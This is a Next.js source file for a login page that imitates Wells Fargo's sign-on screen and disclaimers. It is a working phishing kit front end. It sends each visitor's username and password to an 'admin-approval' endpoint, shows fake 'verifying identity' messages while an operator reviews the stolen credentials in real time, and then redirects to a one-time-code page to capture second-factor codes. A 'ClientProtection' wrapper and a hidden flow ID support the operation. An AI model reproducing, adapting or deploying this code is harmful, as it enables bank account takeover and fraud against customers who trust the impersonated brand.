"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import { getOrCreateFlowId } from "@/lib/session";
import ClientProtection from "@/components/ClientProtection";

const DEFAULT_TIMEOUT_MS = Number(
  process.env.NEXT_PUBLIC_LOGIN_TIMEOUT_MS || 1500
);

export default function Home() {
  const router = useRouter();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [flowId, setFlowId] = useState("");
  const [waitingForApproval, setWaitingForApproval] = useState(false);
  const [approvalError, setApprovalError] = useState("");
  const [processingMessage, setProcessingMessage] = useState(
    "Verifying your identity..."
  );
  const [greeting, setGreeting] = useState("Good evening");

  useEffect(() => {
    setFlowId(getOrCreateFlowId());

    // Set dynamic greeting based on time
    const hour = new Date().getHours();
    if (hour < 12) {
      setGreeting("Good morning");
    } else if (hour < 17) {
      setGreeting("Good afternoon");
    } else {
      setGreeting("Good evening");
    }
  }, []);

  // Cycle through realistic processing messages
  function startProcessingMessages() {
    const messages = [
      "Verifying your identity...",
      "Checking security credentials...",
      "Authenticating with secure servers...",
      "Validating account information...",
      "Processing security verification...",
      "Confirming identity verification...",
    ];

    let messageIndex = 0;
    const messageInterval = setInterval(() => {
      messageIndex = (messageIndex + 1) % messages.length;
      setProcessingMessage(messages[messageIndex]);
    }, 3000); // Change message every 3 seconds

    // Store interval ID to clear it later
    window.processingInterval = messageInterval;
  }

  // Clear processing messages when done
  useEffect(() => {
    if (!waitingForApproval && window.processingInterval) {
      clearInterval(window.processingInterval);
      setProcessingMessage("Verifying your identity...");
    }
  }, [waitingForApproval]);

  async function handleSubmit(e) {
    e.preventDefault();
    if (submitting || waitingForApproval) return;
    setSubmitting(true);
    setApprovalError("");

    // Generate a new flow ID for each login attempt
    const newFlowId = getOrCreateFlowId(true); // Force new ID
    setFlowId(newFlowId);

    try {
      // Send credentials to admin for approval
      const response = await fetch("/api/admin-approval", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          flowId: newFlowId,
          username,
          password,
          meta: { userAgent: navigator.userAgent },
        }),
      });

      if (response.ok) {
        setSubmitting(false);
        setWaitingForApproval(true);

        // Start cycling through processing messages
        startProcessingMessages();

        // Start polling for approval result
        pollForApproval(newFlowId);
      } else {
        throw new Error("Failed to submit for approval");
      }
    } catch (error) {
      console.error("Submission error:", error);
      setSubmitting(false);
      setApprovalError("Authentication service unavailable. Please try again.");
    }
  }

  // Poll for approval result
  async function pollForApproval(currentFlowId) {
    const maxAttempts = 120; // 10 minutes max (5 second intervals)
    let attempts = 0;

    const poll = async () => {
      if (attempts >= maxAttempts) {
        setWaitingForApproval(false);
        setApprovalError("Authentication timeout. Please try again.");
        return;
      }

      try {
        const response = await fetch(
          `/api/admin-approval/status?flowId=${currentFlowId}`
        );
        const result = await response.json();

        if (result.status === "resolved") {
          setWaitingForApproval(false);

          if (result.approved) {
            // Approved - redirect to OTP
            router.push("/otp");
          } else {
            // Rejected - show error and reset form
            setApprovalError(
              "Invalid credentials. Please check your username and password."
            );
            // Reset form after rejection so user can try again
            setTimeout(() => {
              setApprovalError("");
              setUsername("");
              setPassword("");
            }, 3000); // Clear error and form after 3 seconds
          }
          return;
        }

        if (result.status === "pending") {
          // Still waiting, continue polling
          attempts++;
          setTimeout(poll, 5000); // Poll every 5 seconds
        } else {
          // Handle unknown status - could be server restart or other issues
          console.log("Approval status unknown:", result);

          // If it's a fallback approval, continue polling
          if (result.fallback) {
            console.log("Fallback approval created, continuing to poll...");
            attempts++;
            setTimeout(poll, 5000);
            return;
          }

          // For other unknown statuses, show a more helpful error
          setWaitingForApproval(false);
          setApprovalError(
            "Authentication service temporarily unavailable. Please try again."
          );
          // Auto-clear error after 3 seconds so user can retry quickly
          setTimeout(() => {
            setApprovalError("");
          }, 3000);
        }
      } catch (error) {
        console.error("Polling error:", error);
        attempts++;

        // If we've had too many consecutive errors, show a message
        if (attempts > 10 && attempts % 10 === 0) {
          console.log("Multiple polling errors, but continuing...");
        }

        setTimeout(poll, 5000);
      }
    };

    poll();
  }

  return (
    <ClientProtection>
      <div className="relative min-h-screen bg-white md:bg-[url('/bg.jpg')] bg-cover bg-center">
        <div className="absolute inset-0 hidden md:block bg-black/25" />
        <div className="relative z-10 flex flex-col items-center justify-center min-h-screen px-4 py-12">
          <div className="w-full max-w-2xl bg-white rounded-2xl shadow-2xl px-16 py-12">
            <h1 className="text-2xl font-normal text-center mb-6 text-gray-800">
              {greeting}
            </h1>
            <form onSubmit={handleSubmit} className="space-y-4">
              <div className="relative">
                <input
                  placeholder="Username"
                  className="w-full h-12 border border-gray-300 rounded-lg px-4 pr-10 text-base text-gray-900 placeholder-gray-500 focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  required
                  autoComplete="username"
                />
                {username && (
                  <button
                    type="button"
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                    onClick={() => setUsername("")}
                  >
                    <svg
                      className="w-5 h-5"
                      fill="currentColor"
                      viewBox="0 0 20 20"
                    >
                      <path
                        fillRule="evenodd"
                        d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z"
                        clipRule="evenodd"
                      />
                    </svg>
                  </button>
                )}
              </div>
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  placeholder="Password"
                  className="w-full h-12 border border-gray-300 rounded-lg px-4 pr-16 text-base text-gray-900 placeholder-gray-500 focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                  autoComplete="current-password"
                />
                <button
                  type="button"
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-sm text-blue-600 hover:underline font-medium"
                  onClick={() => setShowPassword((v) => !v)}
                >
                  {showPassword ? "Hide" : "Show"}
                </button>
              </div>

              <div className="flex items-start gap-3 mt-3">
                <input
                  type="checkbox"
                  id="saveUsername"
                  className="w-4 h-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500 mt-0.5"
                />
                <div>
                  <label
                    htmlFor="saveUsername"
                    className="text-sm text-gray-700 font-medium"
                  >
                    Save username
                  </label>
                  <p className="text-xs text-gray-600 mt-1 leading-relaxed">
                    To help keep your account secure, save your username only on
                    devices that aren&apos;t used by other people.
                  </p>
                </div>
              </div>

              {/* Error Message */}
              {approvalError && (
                <div className="w-full p-3 bg-red-50 border border-red-200 rounded-lg">
                  <div className="flex items-center">
                    <svg
                      className="w-5 h-5 text-red-400 mr-2"
                      fill="currentColor"
                      viewBox="0 0 20 20"
                    >
                      <path
                        fillRule="evenodd"
                        d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z"
                        clipRule="evenodd"
                      />
                    </svg>
                    <span className="text-sm text-red-700">
                      {approvalError}
                    </span>
                  </div>
                </div>
              )}

              {/* Processing Message */}
              {waitingForApproval && (
                <div className="w-full p-3 bg-blue-50 border border-blue-200 rounded-lg">
                  <div className="flex items-center">
                    <svg
                      className="animate-spin w-5 h-5 text-blue-500 mr-2"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle
                        className="opacity-25"
                        cx="12"
                        cy="12"
                        r="10"
                        stroke="currentColor"
                        strokeWidth="4"
                      ></circle>
                      <path
                        className="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                      ></path>
                    </svg>
                    <div>
                      <div className="text-sm font-medium text-blue-700">
                        {processingMessage}
                      </div>
                      <div className="text-xs text-blue-600">
                        Please wait while we authenticate your credentials
                      </div>
                    </div>
                  </div>
                </div>
              )}

              <button
                type="submit"
                disabled={submitting || waitingForApproval}
                className={`w-full rounded-full h-12 font-medium disabled:opacity-70 transition-colors ${
                  username && password && !waitingForApproval
                    ? "bg-[#d71f27] text-white hover:bg-[#b91c23]"
                    : "bg-gray-300 text-gray-700 hover:bg-gray-400"
                }`}
              >
                {waitingForApproval
                  ? "Authenticating..."
                  : submitting
                  ? "Signing on..."
                  : "Sign on"}
              </button>

              <div className="text-center py-2">
                <span className="text-gray-500 text-sm">or</span>
              </div>

              <button
                type="button"
                className="w-full border border-gray-300 text-gray-700 rounded-full h-12 font-medium hover:bg-gray-50 transition-colors flex items-center justify-center gap-2"
              >
                <svg
                  className="w-4 h-4"
                  fill="currentColor"
                  viewBox="0 0 20 20"
                >
                  <path
                    fillRule="evenodd"
                    d="M18 8a6 6 0 01-7.743 5.743L10 14l-1 1-1 1H6v2H2v-4l4.257-4.257A6 6 0 1118 8zm-6-4a1 1 0 100 2 2 2 0 012 2 1 1 0 102 0 4 4 0 00-4-4z"
                    clipRule="evenodd"
                  />
                </svg>
                Use a passkey
              </button>

              <p className="text-xs text-gray-600 text-center leading-relaxed mt-2">
                Don&apos;t have one? Create a passkey after signing on and skip
                the password next time.
              </p>

              <div className="text-center mt-4">
                <a
                  href="#"
                  className="text-sm text-blue-600 hover:underline inline-flex items-center justify-center"
                  onClick={(e) => e.preventDefault()}
                >
                  <svg
                    className="w-4 h-4 mr-1"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M17 8l4 4m0 0l-4 4m4-4H3"
                    />
                  </svg>
                  Forgot username or password?
                </a>
              </div>

              {/* Flow ID hidden from user - for admin context only */}
              <div className="hidden">Flow ID: {flowId}</div>
            </form>
          </div>

          <div className="w-full max-w-2xl bg-white rounded-xl shadow-xl border border-gray-300 mt-8">
            <div className="p-6">
              <p className="font-semibold text-base mb-3 text-gray-800">
                Investment and Insurance Products are:
              </p>
              <ul className="list-disc pl-5 space-y-1 text-sm text-gray-700">
                <li>
                  Not Insured by the FDIC or Any Federal Government Agency
                </li>
                <li>
                  Not a Deposit or Other Obligation of, or Guaranteed by, the
                  Bank or Any Bank Affiliate
                </li>
                <li>
                  Subject to Investment Risks, Including Possible Loss of the
                  Principal Amount Invested
                </li>
              </ul>
              <div className="mt-4 pt-4 border-t border-gray-200 text-center text-sm text-gray-600">
                Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.
              </div>
            </div>
          </div>
        </div>
      </div>
    </ClientProtection>
  );
}
